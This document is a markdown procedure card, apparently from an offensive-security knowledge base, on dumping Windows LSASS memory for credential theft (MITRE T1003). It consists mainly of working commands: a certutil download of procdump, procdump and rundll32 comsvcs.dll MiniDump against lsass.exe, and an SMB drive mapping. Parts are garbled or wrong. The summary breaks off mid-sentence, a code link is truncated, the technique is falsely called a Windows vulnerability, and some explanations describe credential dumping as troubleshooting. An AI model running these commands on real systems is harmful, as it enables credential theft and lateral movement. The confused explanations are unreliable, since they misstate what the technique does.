---
id: dc16b4de-6b7d-4ad6-9504-30ff1bbe95d6
name: Windows - Mimikatz Mini Dump
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:27.186048+00:00'
updated_at: '2023-04-10T20:37:14.759842+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Credential Dumping|T1003 - Credential Dumping]]'
tags:
- '[[Mini Dump]]'
- '[[Windows - Mimikatz]]'
commands:
- '[[Create memory dump of lsass.exe using HTTP method]]'
- '[[Create memory dump of lsass.exe using SMB method]]'
- '[[Download procdump.exe using HTTP method]]'
- '[[Download procdump.exe using SMB method]]'
- '[[Find lsass''s pid]]'
---

# Windows - Mimikatz Mini Dump

## Summary

The Mimikatz Mini Dump technique is used to dump the memory of the LSASS process, which contains sensitive information such as passwords and credentials. This technique is often used by attackers to steal authentication tokens and gain access to other systems on the network. To accomplish this, the

## Description

# Description

The Mimikatz Mini Dump technique is used to dump the memory of the LSASS process, which contains sensitive information such as passwords and credentials. This technique is often used by attackers to steal authentication tokens and gain access to other systems on the network. To accomplish this, the attacker will typically use the Mimikatz tool to dump the memory of the LSASS process and then extract the relevant information.

From a technical perspective, the Mimikatz Mini Dump technique works by exploiting a vulnerability in the Windows operating system that allows an attacker to extract the memory of the LSASS process. This vulnerability can be exploited using a variety of techniques, including the use of the Mimikatz tool.

From a business perspective, the Mimikatz Mini Dump technique represents a significant threat to organizations as it allows attackers to steal sensitive information and gain access to other systems on the network.

## Requirements

1. Access to the target system

1. Privileged access to run the Mimikatz tool

## Defense

1. Limit access to sensitive systems and information to only authorized personnel

1. Implement strong authentication mechanisms, such as multi-factor authentication

1. Monitor for suspicious activity, such as repeated attempts to dump the memory of the LSASS process

## Objectives

1. Dump the memory of the LSASS process

1. Extract sensitive information such as passwords and credentials

# Instructions

1. procdump -ma lsass.exe lsass.dmp

**Code**: [[procdump]]

> This command is used to create a dump of the LSASS process. The dump can be analyzed to investigate any issues related to authentication or security. The -ma switch creates a full memory dump of the process. The first argument 'lsass.exe' specifies the name of the process to be dumped and the second argument 'lsass.dmp' specifies the name of the dump file that will be created.

2. To dump lsass.exe using Procdump, follow these steps:

1. Download Procdump from http://live.sysinternals.com/procdump.exe using the certutil command.
2. Dump the lsass.exe process using the following command: C:\Users\Public\procdump.exe -accepteula -ma lsass.exe lsass.dmp

Alternatively, you can use the SMB method to dump the process:

1. Map the network drive using the following command: net use Z: https://live.sysinternals.com
2. Find the PID of the lsass.exe process using the following command: tasklist /fi "imagename eq lsass.exe"
3. Dump the lsass.exe process using the following command: Z:\procdump.exe -accepteula -ma $lsass_pid lsass.dmp

**Code**: [[# HTTP method - using the default way
certutil -ur]]

> This command is used to dump the lsass.exe process using Procdump. Procdump is a command-line utility that can be used to generate memory dumps of processes based on a variety of triggers. The command uses two methods to dump the process - HTTP and SMB. The HTTP method is the default method and is used to download Procdump from the live.sysinternals.com website. The SMB method is used to map a network drive and then dump the process using the PID of the lsass.exe process. The command also explains the arguments used in the Procdump command and provides step-by-step instructions on how to use the command.

**Command** ([[Download procdump.exe using HTTP method]]):

```bash
certutil -urlcache -split -f http://live.sysinternals.com/procdump.exe C:\Users\Public\procdump.exe
```

**Command** ([[Create memory dump of lsass.exe using HTTP method]]):

```bash
C:\Users\Public\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

**Command** ([[Download procdump.exe using SMB method]]):

```bash
net use Z: https://live.sysinternals.com
```

**Command** ([[Find lsass's pid]]):

```bash
tasklist /fi "imagename eq lsass.exe"
```

**Command** ([[Create memory dump of lsass.exe using SMB method]]):

```bash
Z:\procdump.exe -accepteula -ma $lsass_pid lsass.dmp
```

3. rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump (ProcessID) (DumpFilePath)

**Code**: [[rundll32]]

> This command is used to dump the lsass.exe process for troubleshooting purposes. The (ProcessID) argument specifies the process ID of the lsass.exe process, and the (DumpFilePath) argument specifies the path and filename for the dump file. The dump file can then be analyzed to determine the cause of any issues with the lsass.exe process.

4. To create a full dump of the LSASS process, run the following command in PowerShell:

**Code**: [[rundll32.exe C:\Windows\System32\comsvcs.dll, Mini]]

> This command uses the MiniDump utility to create a full memory dump of the LSASS process. The dump file will be saved in the C:\temp directory with the name lsass.dmp. The $lsass_pid variable should be replaced with the process ID of the LSASS process. This command is useful for troubleshooting LSASS related issues or for forensic analysis.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Credential Dumping|T1003 - Credential Dumping]]

## Commands Used

- [[Create memory dump of lsass.exe using HTTP method]]
- [[Create memory dump of lsass.exe using SMB method]]
- [[Download procdump.exe using HTTP method]]
- [[Download procdump.exe using SMB method]]
- [[Find lsass's pid]]

## Tags

- [[Mini Dump]]
- [[Windows - Mimikatz]]
